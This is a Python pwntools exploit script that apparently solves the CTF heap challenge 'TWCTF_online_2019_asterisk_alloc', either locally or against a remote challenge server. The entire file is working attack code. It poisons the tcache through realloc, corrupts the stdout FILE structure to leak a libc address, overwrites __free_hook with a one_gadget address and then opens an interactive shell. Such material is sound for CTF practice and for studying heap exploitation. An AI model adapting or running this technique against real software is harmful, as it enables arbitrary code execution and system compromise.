#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./TWCTF_online_2019_asterisk_alloc')
	elf = ELF('./TWCTF_online_2019_asterisk_alloc',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

else:
	p = remote("node3.buuoj.cn",28374)
	elf = ELF('./TWCTF_online_2019_asterisk_alloc',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

def menu(cmd):
    sla("Your choice: ",str(cmd))

def malloc(size,content):
    menu(1)
    sla("Size: ",str(size))
    sda("Data: ",content)

def calloc(size,content):
    menu(2)
    sla("Size: ",str(size))
    sda("Data: ",content)

def realloc(size,content):
    menu(3)
    sla("Size: ",str(size))
    sda("Data: ",content)

def free(choice):
    menu(4)
    sla("Which: ",choice)

###leak libc###
realloc(0x80,'AAAA')
realloc(0,'')
realloc(0x100,'BBBB')
realloc(0,'')
realloc(0xa0,'CCCC')
realloc(0,'')

realloc(0x100,'AAAA')
[free('r') for i in range (7)]
realloc(0,'')

realloc(0x80,'AAAA')
payload = 'A' * 0x88 + p64(0x31) + '\x60' + '\x77'
realloc(0x100,payload)
realloc(0,'')


realloc(0x100,'AAAA')
realloc(0,'')
payload = p64(0xfbad1887) + p64(0) * 3 + '\x58'
realloc(0x100,payload)

libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x3e82a0
success(hex(libc_base))
pause()

###hijack free_hook###
one_gadget = libc_base + 0x4f322
free_hook = libc_base + libc.symbols['__free_hook']

realloc(-1 ,'')
realloc(0x80,'AAAA')
realloc(0,'')
realloc(0xa0,'BBBB')
realloc(0,'')

realloc(0x80,'AAAA')
payload = 'A' * 0x88 + p64(0x41) + p64(free_hook)
realloc(0x100,payload)
realloc(0,'')

realloc(0x20,'AAAA')
realloc(0,'')
realloc(0x20,p64(one_gadget))

###get shell##
free('r')
ia()